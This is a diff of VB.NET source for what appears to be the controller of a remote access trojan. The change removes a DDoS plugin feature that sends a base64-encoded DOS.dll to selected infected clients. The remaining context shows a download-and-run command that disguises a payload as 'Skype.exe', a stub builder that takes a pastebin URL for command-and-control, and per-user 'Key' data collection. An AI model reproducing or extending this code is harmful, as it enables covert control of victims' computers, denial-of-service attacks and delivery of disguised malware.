@@ -212,30 +212,6 @@ Public Class Form1
                 Case "MSG"
                     Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
 
-                Case "MSG_DDOS"
-                    If Me.InvokeRequired Then
-                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
-                        Exit Sub
-                    End If
-
-                    Dim DDOS As DDOS = My.Application.OpenForms("DDOS")
-                    DDOS.Messages_DDOS("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
-
-                Case "DDOS"
-                    If Me.InvokeRequired Then
-                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
-                        Exit Sub
-                    End If
-
-                    Dim DDOS As DDOS = My.Application.OpenForms("DDOS")
-                    If DDOS Is Nothing Then
-                        DDOS = New DDOS
-                        DDOS.F = Me
-                        DDOS.u = u
-                        DDOS.Name = "DDOS"
-                        DDOS.Show()
-                    End If
-
                 Case "Key"
 
                     If Not IO.Directory.Exists("Users" + "\" + A(1).ToString) Then
@@ -761,12 +737,6 @@ Public Class Form1
         Next
     End Sub
 
-    Private Sub DDOSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDOSToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugen" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DOS.dll")))
-        Next
-    End Sub
-
     Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
         Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
         Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
@@ -911,7 +881,7 @@ Public Class Form1
                 MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                 Return
             ElseIf Pastebin.Text = "" Or Not Pastebin.Text.Contains("http") Then
-                MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
+                MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
                 Return
             Else
                 Try
